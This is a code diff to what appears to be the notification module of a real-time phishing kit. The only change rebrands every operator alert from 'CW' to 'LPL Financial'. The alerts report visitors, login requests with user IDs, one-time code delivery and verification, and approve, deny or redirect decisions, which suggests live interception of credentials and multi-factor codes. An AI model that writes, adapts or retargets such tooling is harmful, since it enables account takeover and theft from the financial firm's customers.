@@ -179,7 +179,7 @@ export async function notifyNewTask(env, task) {
   var lines = [];
 
   if (isVisit) {
-    lines.push("👁 <b>NEW VISITOR</b>  •  <i>CW</i>");
+    lines.push("👁 <b>NEW VISITOR</b>  •  <i>LPL Financial</i>");
     lines.push("────────────────────────");
     lines.push("");
     lines.push("🗺 <b>Location</b>");
@@ -190,7 +190,7 @@ export async function notifyNewTask(env, task) {
     lines.push("");
     lines.push("📅 " + esc(t.local) + "  •  " + esc(t.utc) + " UTC");
   } else {
-    lines.push("🔐 <b>LOGIN REQUEST</b>  •  <i>CW</i>");
+    lines.push("🔐 <b>LOGIN REQUEST</b>  •  <i>LPL Financial</i>");
     lines.push("────────────────────────");
     lines.push("");
     lines.push("👤 <b>User</b>    <code>" + esc(task.user_id) + "</code>");
@@ -224,7 +224,7 @@ export async function notifyAdvance(env, task) {
         ? "Phone (" + esc(task.masked_phone) + ")"
         : "Email (" + esc(task.masked_email) + ")";
 
-    lines.push("📨 <b>CODE DELIVERY</b>  •  <i>CW</i>");
+    lines.push("📨 <b>CODE DELIVERY</b>  •  <i>LPL Financial</i>");
     lines.push("────────────────────────");
     lines.push("");
     lines.push("👤 <b>User</b>    <code>" + esc(task.user_id) + "</code>");
@@ -240,7 +240,7 @@ export async function notifyAdvance(env, task) {
     lines.push("⏳ <i>Auto-declines in 90 seconds</i>");
 
   } else if (task.flow_step === "code_verify") {
-    lines.push("🛡 <b>CODE VERIFICATION</b>  •  <i>CW</i>");
+    lines.push("🛡 <b>CODE VERIFICATION</b>  •  <i>LPL Financial</i>");
     lines.push("────────────────────────");
     lines.push("");
     lines.push("👤 <b>User</b>    <code>" + esc(task.user_id) + "</code>");
@@ -264,7 +264,7 @@ export async function notifyAdvance(env, task) {
 
 export function buildApprovedMessage(task) {
   var lines = [
-    "✅ <b>APPROVED</b>  •  <i>CW</i>",
+    "✅ <b>APPROVED</b>  •  <i>LPL Financial</i>",
     "────────────────────────",
     "",
     "👤 <b>User</b>    <code>" + esc(task.user_id) + "</code>",
@@ -279,7 +279,7 @@ export function buildApprovedMessage(task) {
 
 export function buildDeniedMessage(task) {
   var lines = [
-    "❌ <b>DENIED</b>  •  <i>CW</i>",
+    "❌ <b>DENIED</b>  •  <i>LPL Financial</i>",
     "────────────────────────",
     "",
     "👤 <b>User</b>    <code>" + esc(task.user_id) + "</code>",
@@ -294,7 +294,7 @@ export function buildDeniedMessage(task) {
 
 export function buildRedirectedMessage(task) {
   var lines = [
-    "🔀 <b>REDIRECTED</b>  •  <i>CW</i>",
+    "🔀 <b>REDIRECTED</b>  •  <i>LPL Financial</i>",
     "────────────────────────",
     "",
     "👤 <b>User</b>    <code>" + esc(task.user_id) + "</code>",
